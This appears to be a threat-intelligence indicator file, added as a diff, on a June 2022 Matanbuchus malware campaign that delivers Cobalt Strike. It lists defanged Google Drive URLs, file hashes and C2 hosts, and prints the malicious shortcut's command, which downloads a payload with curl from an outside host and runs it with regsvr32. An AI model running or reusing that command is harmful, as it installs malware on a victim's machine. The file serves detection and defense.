@@ -1,0 +1,98 @@
+2022-06-17 (FRIDAY) - MATANBUCHUS ACTIVITY WITH COBALT STRIKE
+
+REFERENCE:
+
+- https://twitter.com/Unit42_Intel/status/1537904451108818946
+
+14 EXAMPLES OF GOOGLE DRIVE URLS HOSTING MALICIOUS ZIP ARCHIVES:
+
+- hxxps://drive.google[.]com/uc?export=download&id=1ZLKo89rNAwoXslj5L5MAIooU2WuqwAZp&confirm=t
+- hxxps://drive.google[.]com/uc?export=download&id=1p3kFRq4CNWCIOs0CXEdxuRZ_Yq02hYeV&confirm=t
+- hxxps://drive.google[.]com/uc?export=download&id=1XK3UBhCLs1XrT0TGLQThBAU5Ts5Zax15&confirm=t
+- hxxps://drive.google[.]com/uc?export=download&id=1FTs2987MLLW9S6XyzHjixv-hnku8wRRJ&confirm=t
+- hxxps://drive.google[.]com/uc?export=download&id=1-CAdGFHqjgRH7Trbhu9Uevsw8FEwiWCH&confirm=t
+- hxxps://drive.google[.]com/uc?export=download&id=14AH-8OnIg8NJZIE_jjtBOYbOUWqgA4sq&confirm=t
+- hxxps://drive.google[.]com/uc?export=download&id=1vOmfVjrqu31rgmAOVvJjzUus3mim8FAW&confirm=t
+- hxxps://drive.google[.]com/uc?export=download&id=1_NiYYabxFarNvGlo1Z_4DzZ8sGbJLRcy&confirm=t
+- hxxps://drive.google[.]com/uc?export=download&id=13bK7sNO1-HvLuwBhR1vipi_PL3iRAZjI&confirm=t
+- hxxps://drive.google[.]com/uc?export=download&id=1a-q2mpzjiab024WPwweQ75h3PoB62hU0&confirm=t
+- hxxps://drive.google[.]com/uc?export=download&id=1OCsLdZApFPGqE386n4_poqo0oazHOFPQ&confirm=t
+- hxxps://drive.google[.]com/uc?export=download&id=1IikXt7oUrcQJ4q5BdOdu61i9je6gSqrR&confirm=t
+- hxxps://drive.google[.]com/uc?export=download&id=17dqStecgoaRGMCO5doPptvm67rC1Lddg&confirm=t
+- hxxps://drive.google[.]com/uc?export=download&id=1mXJNgeAGYha_pUHNvJUNDjOZ8PeO7fXQ&confirm=t
+
+SHA256 HASHES FOR 14 ZIP ARCHIVES DOWNLOADED FROM THE ABOVE URLS:
+
+- 82f967b7ae4919cd4b1ead95744ec6e43975934e93c35d59e58112f83c3c9845  AreaDoc1640.zip
+- 1ecd6f53ea94c669e847d6255276354a4f6528a8266391721bfb2d05fc2cad70  AreaDoc2687.zip
+- 4fffb80c1ab1ce17099b1ba7773cd317bc2c0cd2d3d30b408bfc1e2b0215c1e7  AreaDoc3024.zip
+- 34286ec7af686e5e1cc244e489918fc00c903e8648e986d07ba2dfe01da889f6  AreaDoc3634.zip
+- bd1b0045a4931e480d455b5f5906259e3120170de2e8ec848bc8f051fc937d55  AreaDoc3768.zip
+- d9cc0335b5f68f089caca67932c5b28df82fa31939ebcae170a3f5b3f57207d2  AreaDoc4872.zip
+- 7440d36eabf9ce73a59f2bd5b89a9b0e2e36a7960855d160373150e4fef7db1d  AreaDoc4921.zip
+- 4980938f86123a8e45b58c523d2ade1694636e8d2a8e34fd2e5d4534c9271768  AreaDoc4945.zip
+- cfffc9f756fdf4065b60c8936569c0d97ccee9c8fdb1ee375f995108fa43c686  AreaDoc5122.zip
+- 57bac98d0b96c937a3671506ce5399331ddf535542f77f4df3f0dfb9edac4c54  AreaDoc6195.zip
+- 0808e0f13a59b678113cc0b3f7fdcc70c28a44b441cfa7651e5d40e17f50e624  AreaDoc7702.zip
+- de888888dfdb76a9c34de94511b88ae355eb1c9fb38f3ccd8a4e73054c2257c3  AreaDoc8084.zip
+- 55f835ad315d139296458147524f1f32a22b62f4fe33046850888fce6f72e648  AreaDoc9209.zip
+- 8d9c315fafebc7b19b1a5153b95b5e4e0ed103e86c09c9b1db1a620a71504889  AreaDoc9547.zip
+
+SHA256 HASHES FOR 14 WINDOWS SHORTCUTS EXTRACTED FROM THE ABOVE ZIP ARCHIVES:
+
+- b725ca302134e81ba9f67f1a5549fe8189c1d2d53a899ec120326f948270dbae  AreaDoc264.lnk
+- fe0a79d00d28faafa84194854d71bfc5e6d71b6be13661c56a8868d2e9dff716  AreaDoc301.lnk
+- 16ed14f7e99e7ddd5ae9ea259dfe0999a922f1d8b2b0fe033a1f2a42ce0ad92c  AreaDoc355.lnk
+- 4692a6f5073f644e50617d4bb5b2236ab60384c1840a00fc1dd7c768641f53f1  AreaDoc385.lnk
+- 7b228f22b1ca0f688fc8d00e29c7e06f50863ede0e990f3502c1773f69cef771  AreaDoc419.lnk
+- a19a8cc39ca3a0ea3571bd06c3c3421f2def635e7dfe72c460c10ccf34817e0e  AreaDoc450.lnk
+- d8c21ff6fe4617b22ff37e74a1d29adb08d3164d43d7ed205c207964f4313a72  AreaDoc522.lnk
+- 34bc60943b067fdbbf72c56df7d57be9d1c9004258d4460b6e25861abaa91009  AreaDoc594.lnk
+- d5bfc2ef6d5dbc61959ba64a5bf5305e8da13e569b4a8a138e79f86a44e38d75  AreaDoc712.lnk
+- ab0cab19bc483933300f20591c34d2871258cf4de1e2c19821c9899d05b33651  AreaDoc781.lnk
+- e7f1e2f604d1137c168e3bb89b6b7bce0c552274561857452b9b92f99bd468cc  AreaDoc785.lnk
+- d17d6c0ec32fdd15b8219513bc4157aacc699ce00e905ead59059f8875fcde85  AreaDoc866.lnk
+- 5a37dbc0fa047493c25e7873f7d187319a2dafb96882dff574d1bf201de487bb  AreaDoc987.lnk
+- 9730e27a56864601d6dc2ea911b02c2599dbb2c61aa3ef5363891b90735a9e78  AreaDoc994.lnk
+
+COMMANDS RUN BY THE ABOVE WINDOWS SHORTCUTS:
+
+C:\Windows\System32\cmd.exe /q /c echo 'FJ' 
+&& MD "%USERPROFILE%\fm_j" 
+&& curl.exe --output %USERPROFILE%\fm_j\ooTCNA.Hcw.Thw hxxps://slgemseller[.]com/rmaS/Es.png 
+&& regsvr32 -e -n -i:"Update Installation" "%USERPROFILE%\fm_j\ooTCNA.Hcw.Thw" 
+&& ping pXl.com
+
+ASSOCIATED MALWARE:
+
+- SHA256 hash: e9d8b76f3bb2a548c7d9aaf16bf368d550c3072f9cbdca2b1a28fc4ccc065a3b
+- File size: 1,606,719 bytes
+- File location: hxxps://slgemseller[.]com/rmaS/Es.png
+- File location: C:\Users\[username]\fm_j\ooTCNA.Hcw.Thw
+- File description: Initial 32-bit DLL for Matanbuchus
+- Run method: regsvr32.exe -e -n -i:"Update Installation" [filename]
+
+- SHA256 hash: 48ad2fadb0550066f0ee1d20b73cdb397c53479152c2f3d14fe7d09b8a972117
+- File size: 1,595,904 bytes
+- File location: C:\Users\[username]\AppData\Local\a53c\x86.nls
+- File description: Persistent 32-bit DLL for Matanbuchus
+- Run method: regsvr32.exe -e -n -i:"UpdateCheck" [filename]
+
+TRAFFIC FROM AN INFECTED WINDOWS HOST:
+
+- 162.214.157.176 port 443 - hxxps://slgemseller[.]com/rmaS/Es.png
+
+TRAFFIC CAUSED BY MATANBUCHUS:
+
+- 31.41.244[.]227 port 443 - communicationreporting[.]com - HTTPS traffic
+- 31.41.244[.]230 port 443 - telemetryservic[.]com - HTTPS traffic
+- 31.41.244[.]230 port 65383 - telemetryservic[.]com - POST /KkfUWR/kFAWCs/requets/index.php
+
+TRAFFIC CAUSED BY MATANBUCHUS FOR COBALT STRIKE FILE(S):
+
+- 31.41.244[.]225 port 443 - instance-manager[.]at - HTTPS traffic
+
+COBALT STRIKE C2:
+
+- 23.82.141[.]136 port 443 - gudugil[.]com - HTTPS traffic
+- 23.82.141[.]136 port 443 - HTTPS traffic
